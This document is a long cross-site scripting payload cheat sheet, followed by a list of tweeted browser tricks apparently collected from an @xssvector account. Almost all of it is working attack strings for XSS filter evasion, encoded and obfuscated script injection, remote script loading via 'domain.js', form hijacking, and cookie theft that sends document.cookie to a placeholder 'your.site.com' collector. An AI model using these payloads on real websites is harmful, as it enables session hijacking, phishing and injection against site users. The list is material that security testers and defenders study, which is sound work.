Null-byte character between equal sign and JavaScript code (IE).
<img src='1' onerror=\x00alert(0) />
Null-byte character between characters of HTML attribute names (IE).
<img src='1' o\x00nerr\x00or=alert(0) />
Null-byte character before characters of HTML element names (IE).
<\x00img src='1' onerror=alert(0) />
Null-byte character after characters of HTML element names (IE, Safari).
<script\x00>alert(1)</script>
Null-byte character between characters of HTML element names (IE).
<i\x00mg src='1' onerror=alert(0) />
Use slashes instead of whitespace (IE, Firefox, Chrome, Safari).
<img/src='1'/onerror=alert(0)>
Use vertical tabs instead of whitespace (IE, Safari).
<img\x0bsrc='1'\x0bonerror=alert(0)>
Use quotes instead of whitespace in some situations (Safari).
<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">
Use null-bytes instead of whitespaces in some situations (IE).
<img src='1'\x00onerror=alert(0)>
Just don't use spaces (IE, Firefox, Chrome, Safari).
<img src='1'onerror=alert(0)>
Prefix URI schemes.
Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->
No greater-than characters needed (IE, Firefox, Chrome, Safari).
<img src='1' onerror='alert(0)' <
Extra less-than characters (IE, Firefox, Chrome, Safari).
<<script>alert(0)</script>
Backslash character between expression and opening parenthesis (IE).
<style>body{background-color:expression\(alert(1))}</style>
JavaScript Escaping
<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>
Encoding Galore.
HTML Attribute Encoding
<img src="1" onerror="alert(1)" />
<img src="1" onerror="alert(1)" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:alert(1)"></iframe>
URL Encoding
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
CSS Hexadecimal Encoding (IE specific examples)
<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>
JavaScript (hexadecimal, octal, and unicode)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>
JavaScript (Decimal char codes)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>
JavaScript (Unicode function and variable names)
<script>alert(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>
Overlong UTF-8 (SiteMinder is awesome!)
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
<img src="1" onnerror="alert(1)">
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE
UTF-7 (Missing charset?)
<img src="1" onerror="alert(1)" />
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
Unicode .NET Ugliness
<script>alert(1)</script>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
Classic ASP performs some unicode homoglyphic translations... don't ask why...
<img src="1" onerror="alert('1')">
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A
Useless and/or Useful features.
HTML 5 (Not comphrensive)
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />
Usuage of non-existent elements (IE)
<blah style="blah:expression(alert(1))" />
CSS Comments (IE)
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />
Alternate ways of executing JavaScript functions
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>
Split up JavaScript into HTML attributes
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
HTML is parsed before JavaScript
<script>
var junk = '</script><script>alert(1)</script>';
</script>
HTML is parsed before CSS
<style>
body { background-image:url('http://www.blah.com/</style><script>alert(1)</script>'); }
</style>
XSS in XML documents [doctype = text/xml] (Firefox, Chrome, Safari).
<?xml version="1.0" ?>
<someElement>
<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
</someElement>
URI Schemes
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)
HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&a=val2
ASP.NET     a = val1,val2
ASP         a = val1,val2
JSP         a = val1
PHP         a = val2
Two Stage XSS via fragment identifier (bypass length restrictions / avoid server logging)
<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)
http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)
Two Stage XSS via name attribute
<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>
Non-alphanumeric crazyness...
<script>
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
</script>
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
<img src=x onerror=with(document)body.appendChild(document.createElement('script')).src="domain.js"></img>
<img src=x onerror="with(document)body.appendChild(createElement('script')).src='domain.js'"></img>
<img src=1 onerror=jQuery.getScript("domain.js")> 
<img src="#" onerror="$.getScript('domain.js')">
<img src="#" onerror="var a=String.fromCharCode(47);$.getScript(a+a+'domain.sj'+a+'4091')">
<img src='0' onerror=with(document)body.appendChild(createElement('script')).src='domain.js'>
<img src="#" onload="s=document.createElement('script');s.src='domain.js'+Math.random();document.body.appendChild(s)" border="0">
<img src=i onerror=eval(jQuery.getScript('domain.js'))>
<img src=N onerror=eval(javascript:document.write(unescape(' <script src="domain.js"></script>'));)>
<img src=x onerror=document.body.appendChild(document.createElement('script')).src='domain.js'>
<img src=x onerror="with(document)body.appendChild(createElement('script')).src='domain.js'" width="0" height="0"></img>
<  script > < / script>
&lt
&lt;
&LT
&LT;
<
<<
<<<
"><script>"
<script>alert("XSS")</script>
<<script>alert("XSS");//<</script>
<script>alert(document.cookie)</script>
'><script>alert(document.cookie)</script>
'><script>alert(document.cookie);</script>
";alert('XSS');//
%3cscript%3ealert("XSS");%3c/script%3e
%3cscript%3ealert(document.cookie);%3c%2fscript%3e
%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
&ltscript&gtalert(document.cookie);</script>
&ltscript&gtalert(document.cookie);&ltscript&gtalert
<xss><script>alert('XSS')</script></vulnerable>
<IMG%20SRC='javascript:alert(document.cookie)'>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS')"
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG%20SRC='javasc	ript:alert(document.cookie)'>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'???.cookie</script>
%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
'';!--"<XSS>=&{()}
<name>','')); phpinfo(); exit;/*</name>
<![CDATA[<script>var n=0;while(true){n;}</script>]]>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉
TWITTER @xssvector Tweets:

<img language=vbs src=<b onerror=alert#1/1#>
Opera cross-domain set cookie 0day: document.cookie='xss=jackmasa;domain=.me.'
Reverse 401 basic auth phishing by @jackmasa POC:  
document.domain='com' chrome/safari same domain suffix cross-domain trick.   
Safari empty location bar bug by @jackmasa POC:   
Safari location object pollution tech:  by @kinugawamasato  
Safari URL spoofing about://mmme.me POC: 
Opera URL spoofing vuln data://mmme.me by @jackmasa POC:  
Universal URL spoofing data:;//mmme.me/view/1#1,2 #firefox #safari #opera  
New dom xss vector xxx.innerHTML=document.title  by @0x6D6172696F 
Opera data:message/rfc822 #XSS  by @insertScript 
#IE <iframe><iframe src=javascript:alert(/@jackmasa/)></iframe>  
IE cool expression xss <div id="alert(/@0x6D6172696F/)" style="x:expression(eval)(id)">  
Clever webkit xss auditor bypass trick <script?=data:,alert(1)<!--  by @cgvwzq 
Bypass IE8 version flash docuemnt object protection  by @jackmasa 
Bypass IE all version flash docuemnt object protection  by @gainover1 
Bypass IE9 flash docuemnt object protection  by @irsdl 
Bypass IE8 flash docuemnt object protection  by @irsdl 
New XSS vector (#Opera Specific) <sVg><scRipt %00>prompt&lpar;/@soaj1664ashar/&rpar;​​​​​​​​​​​​​​​​  
IE xss filter bypass 0day : <xml:namespace prefix=t><import namespace=t implementation=..... by @gainover1 #IE #0day  
<iframe srcdoc='&lt;svg/onload=alert(/@80vul/)&gt;'> #chrome  
IE xss filter bypass 0day :<script/%00%00v%00%00>alert(/@jackmasa/)</script> and %c0″//(%000000%0dalert(1)// #IE #0day  
new XMLHttpRequest().open("GET", "data:text/html,<svg onload=alert(/@irsdl/)></svg>", false); #firefox #datauri  
<h1 onerror=alert(/@0x6D6172696F/)>XSS</h1><style>*:after{content:url()}</style> #firefox  
<script for=_ event=onerror()>alert(/@ma1/)</script><img id=_ src=> #IE  
"<a href=javascript&.x3A;alert&(x28;1&)x29;//=>clickme #IE #xssfilter  @kinugawamasato 
Components.lookupMethod(self, 'alert')(1) #firefox  
external.NavigateAndFind(' ',[],[]) #IE #URLredirect  
<?php header('content-type:text/html;charset=utf-7-utf-8-shift_jis');?> IE decides charset as #utf-7 @hasegawayosuke 
<meta http-equiv=refresh content="0 javascript:alert(1)"> #opera  
<meta http-equiv=refresh content="?,javascript&colon;alert(1)"> #chrome  
<svg contentScriptType=text/vbs><script>MsgBox"@insertScript"<i> #IE9 #svg #vbscript  
setTimeout(['alert(/@garethheyes/)']); #chrome #safari #firefox  
<svg></ y="><x" onload=alert('@0x6D6172696F')>  #svg 
Event.prototype[0]='@garethheyes',Event.prototype.length=1;Event.prototype.toString=[].join;onload=alert #webkit #opera  
URL-redirect vuln == XSS ! Location:data:text/html,<svg/onload=alert(document.domain)> #Opera @jackmasa 
<a href="data:application/x-x509-user-cert;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>​  #Chrome #XSS @RSnake 
Clipboard-hijack without script and css: http://<bdo dir=rtl>elgoog</bdo>.com  
Opera:<style>*{-o-link:'data:text/html,<svg/onload=alert(/@garethheyes/)>';-o-link-source:current}</style><a href=1>aaa  
$=<>@mozilla.org/js/function</>;$::[<>alert</>](/@superevr/) #firefox  
Firefox cookie xss: with(document)cookie='∼≩≭≧∯≳≲≣∽≸≸∺≸∠≯≮≥≲≲≯≲∽≡≬≥≲≴∨∱∩∾',write(cookie);  by @jackmasa 
<svg><script>location&equals;&#60&#62javascript&amp;#x3A;alert(1)&#60&#33&#47&#62;</script> #Firefox #JustForFun  
Just don't support IE <a href=[0x0b]" onclick=alert(1)//">click</a>  
<style>//<!--</style> -->*{x:expression(alert(/@jackmasa/))}//<style></style>  
<!-- --!><input value="--><body/onload=`alert(/ @jackmasa /)//`">  #IE #XSS 
Input[hidden] XSS <input type=hidden style=`x:expression(alert(/ @garethheyes /))`> target it.  
Firefox clipboard-hijack without script and css : http://<img alt="evil/#" width=0 height=0 >  
<![<img src=x:x onerror=`alert(/ @jackmasa /)//`]-->  
#E4X <{alert(1)}></{alert(2)}>.(alert(3)).@wtf.(wtf) by @garethheyes 
#vbscript coool feature chr(&H4141)="A", Chr(7^5)=A and Chr(&O41) =‘A’ by @masa141421356 
({})[$='\143\157\156\163\164\162\165\143\164\157\162'][$]('\141\154\145\162\164\50/ @0x6D6172696F /\51')()  
No referer : <iframe src="javascript:'<script src=>;</script>'"></iframe>  
<svg><script>/*&midast;&sol;alert(' @0x6D6172696F ')&sol;&sol;*/</script></svg>​  
#VBScript Event Handling: [Sub XXX_OnError MsgBox " @0x6D6172696F " End Sub]  
if(1)alert(' @jackmasa ')}{ works in firebug and webkit's console 
<svg><script onlypossibleinopera:-)> alert(1) #opera  by @soaj1664ashar 
<![if<iframe/onload=vbs::alert[:]> #IE  by @0x6D6172696F, @jackmasa 
<svg><script/XL:href=&VeryThinSpace;data&colon;;;;base64;;;;&comma;&lt;&gt;啊YWx啊lc啊nQ啊oMSk啊=> mix!  #opera by @jackmasa 
<! XSS="><img src=xx:x onerror=alert(1)//">  #Firefox #Opera #Chrome #Safari #XSS 
document.body.innerHTML=('<\000\0i\000mg src=xx:x onerror=alert(1)>')  #IE #XSS 
header('Refresh: 0;url=javascript:alert(1)'); 
<script language=vbs></script><img src=xx:x onerror="::alert' @insertScript '::"> 
<a href="data:text/html,<script>eval(name)</script>" target="alert(' @garethheyes @0x6D6172696F ')">click</a> 
#CSS expression <style>*{font-family:'Serif}';x[value=expression(alert(URL=1));]{color:red}</style> 
#ES #FF for(location of ['javascript:alert(/ff/)']); 
#E4X function::['location']='javascript'':alert(/FF/)' 
HTML5 entity char <a href="javas&Tab;cri&NewLine;pt:alert(' @garethheyes ')">test</a> 
#Firefox <a href="x:alert(1)" id="test">click</a> <script>eval(test'')</script> by @cgvwzq 
<div style="color:rgb(''&#0;x:expression(alert(URL=1))"></div> CSS and CSS :P 
toUpperCase XSS document.write('<ı onclıck=&#97&#108&#101&#114&#116&#40&#49&#41>asd</ı>'.toUpperCase())  by @jackmasa 
IE6-8,IE9(quick mode) with jQuery<1.7 $("button").val("<iframe src=vbscript:alert(1)>") by @masa141421356  
aha <script src=>alert(/IE|Opera/)</script> 
Opera bug? <img src=//\ onload=alert(1)>  
Use 127.1 no 127.0.0.1  by @jackmasa 
IE vector location='&#118&#98&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41'  
#jQuery super less-xss,work in IE: $(URL) 6 chars  
#Bootstrap tooltip.js xss  some other plugins (e.g typeahead,popover) are also the same problem //cc @twbootstrap 
innerText DOM XSS: innerHTML=innerText  
Using IE XSS filter or Chrome xss auditor to block <meta> url redirect.  
jQuery 1.8 a new method: $.parseHTML('<img src=xx:X onerror=alert(1)>')  
IE all version CSRF vector <img lowsrc=//google.com>  
Timing vector <img src=//ixss.sinaapp.com/sleep.php> 
Firefox data uri can inherit dom-access. <iframe src="data:D,<script>alert(top.document.body.innerHTML)</script>">  
IE9 <script/onload=alert(1)></script> 
Webkit and FF <style/onload=alert(1)> 
Firefox E4X vector alert(<xss>xs{[function::status]}s</xss>) it is said E4H would replace E4X :P 
IE8 document.write('<img src="<iframe/onload=alert(1)>\0">') 
If you want to share your cool vector, please do not hesitate to let me know :) 
ASP trick: ?input1=<script/&in%u2119ut1=>al%u0117rt('1')</script> by @IRSDL 
New spec:<iframe srcdoc="<svg/onload=alert(domain)>"> #chrome 20 by @0x6D6172696F  
#Firefox syntax broken try{*}catch(e if(alert(1))){} by @garethheyes  
JSON XSS Tips: /json.cgi?a.html by @hasegawayosuke 
JSON XSS Tips: /json/.html with PHP and .NET by or /json;.html with JSP by @superevr 
ß=ss <a href="http://ß.lv">click</a> by @_cweb  
<a href="http://www。example。com">click</a> by @_cweb  
Firefox link host dom xss https://t.co/aTtzHaaG by @garethheyes 
<a href="http://www﹒example﹒com ">click</a> by @_cweb  
history.pushState([],[],'/xssvector') HTML5 URL spoofing! 
Clickjacking with history.forward() and history.back()  by @lcamtuf 
Inertia-Clickjacking for(i=10;i>1;i--)alert(i);new ActiveXObject("WScript.shell").Run('calc.exe',1,true); by @80vul 
XHTML Entity Hijacking [<!ENTITY nbsp "'">]  by @masa141421356 
Firefox <img src=javascript:while([{}]);> 
IE <!--[if<img src=x:x onerror=alert(5)//]--> by @0x6D6172696F H5SC#115  
Firefox funny vector for(i=0;i<100;) find(); by @garethheyes 
IE breaking framebusting vector <script>var location={};</script> 
IE JSON hijack with UTF-7 json={'x':'',x:location='1'} <script src=... charset=utf-7></script> 
Firefox <iframe src=view-source://xxxx.com>; with drag and drop 
<button form=hijack_form_id formaction=//evil style="position:absolute;left:0;top:0;width:100%;height:100%"><plaintext> form hijacking 
Dangling markup injection <img src='//evil by @lcamtuf 
Webkit <iframe> viewsource attribute:  // <iframe viewsource src="//test.de"></iframe> by @0x6D6172696F 
DOM clobbering:<form name=location > clobbered location object on IE. 
DOM clobbering:<form name=document><image name=body> clobbered document->body 
<isindex formaction=javascript:alert(1)> by @jackmasa 
Classic IE backtick DOM XSS: <img src="xx:x" alt="``onerror=alert(1)"><script>document.body.innerHTML=''</script> 
Firefox <a href="https://4294967298915183000">click</a>=>google by @garethheyes 
<a href="data:text/html;base64xoxoxox,<body/onload=alert(1)>">click</a> by @kkotowicz 
Opera <a href="data:text/html;base64,PHN2Zy萨9vbmxv晕YWQ<>>9YWxlc>>>nQoMSk">click</a> variant base64 encode. by @jackmasa 
Opera <svg><image x:href="data:image/svg-xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"> by LeverOne H5SC#88 
Webkit and Opera <a href="\/www.google.com/favicon.ico">click</a> by @kkotowicz 
FF <a href="//ⓜⓜⓜⓔ︒ⓜⓔ">click</a> url trick by @jackmasa 
IE <script>-{valueOf:location,toString:[].pop,0:'vbscript:alert%281%29',length:1}</script> @thornmaker , @sirdarckcat 
<i/onclick=URL=name> IE less xss,20 chars. by @0x6D6172696F 
<a rel="noreferrer" href="//google.com">click</a> no referrer by @sneak_ 
FF <img src="jar:!/"> no referrer by @sneak_ 
No dos expression vector <i style=x:expression(alert(URL=1))> by @jackmasa 
<svg><style>*{font-family:'<svg onload=alert(1)>';}</style></svg> by @0x6D6172696F 
JSLR( @garethheyes ) challenge result: 
@irsdl challenge result:  
<body onload='vbs:Set x=CreateObject("Msxml2.XMLHTTP"):x.open"GET",".":x.send:MsgBox(x.responseText)'> Vbscript XHR by @masa141421356 
XML Entity XSS  by @garethheyes 
Webkit <svg/onload=domain=id> cross-domain and less vector! example: (JSFiddle cross to JSBin) by @jackmasa 
<style>@import//evil? >>>steal me!<<< scriptless by @garethheyes 
IE <input value="<script>alert(1)</script>" ` /> by @hasegawayosuke 
<xmp><img alt="</xmp><img src=xx:x onerror=alert(1)//"> Classic vector by slacker :D 
<a href="#" onclick="alert(' &#39&#41&#59&#97&#108&#101&#114&#116&#40&#50 ')">name</a> Classic html entity inject vector 
A nice opera xss: Put 65535 Bytes before and Unicode Sign  by @insertScript 
<iframe src="jar://html5sec.org/test.jar!/test.html"></iframe> Upload a jar file => Firefox XSS by @0x6D6172696F 
JS Array Hijacking with MBCS encodings ppt  by @hasegawayosuke 
<meta http-equiv="refresh" content="0;url=http://good/[>>>inj]&#59url=http://evil/[<<<inj]"> IE6-7 Inject vector by @kinugawamasato 
IE UTF7 BOM XSS <link rel=stylesheet href='data:,?*%7bx:expression(alert(1))%7D' > by @garethheyes 
<svg><script>a='<svg/onload=alert(1)></svg>';alert(2)</script> by @0x6D6172696F , @jackmasa 
Opera <svg><animation x:href=javascript:alert(1)> SVG animation vector by @0x6D6172696F 
<meta charset=gbk><script>a='xࠄ\';alert(1)//';</script> by @garethheyes 
FF <a href="data:),< s c r i p t > a l e r t ( document.domain ) < / s c r i p t >">CLICK</a> by @0x6D6172696F 
<noscript><!--</noscript><img src=xx:x onerror=alert(1) --> non-IE 
<svg><script xlink:href="data:,alert(1)"> by @0x6D6172696F 
Firefox statusline spoofing<math><maction actiontype="statusline#http://google.com" href="//evil">click by LeverOne  
<svg><oooooo/oooooooooo/onload=alert(1) > by @jackmasa 
<math><script>sgl='<img/src=xx:x onerror=alert(1)>'</script> chrome firefox opera vector by @jackmasa 
FF <applet code=javascript:alert('sgl')> by @jackmasa 
Nice IE DOM XSS: <div id=d><x xmlns="><body onload=alert(1)"><script>d.innerHTML=‘’</script>  by LeverOne 
<script>RuntimeObject("w*")["window"]["alert"](1);</script> IE a new method get window object! by @s_hskz 
<body onload="$})}}}});alert(1);({0:{0:{0:function(){0({"> Chrome crazy vector! by @cgvwzq 
IE <!-- `<img/src=xx:xx onerror=alert(1)//--!> by @jackmasa H5SC: 
<a href="javascript&colon;alert&lpar;1&rpar;">click</a> non-IE 
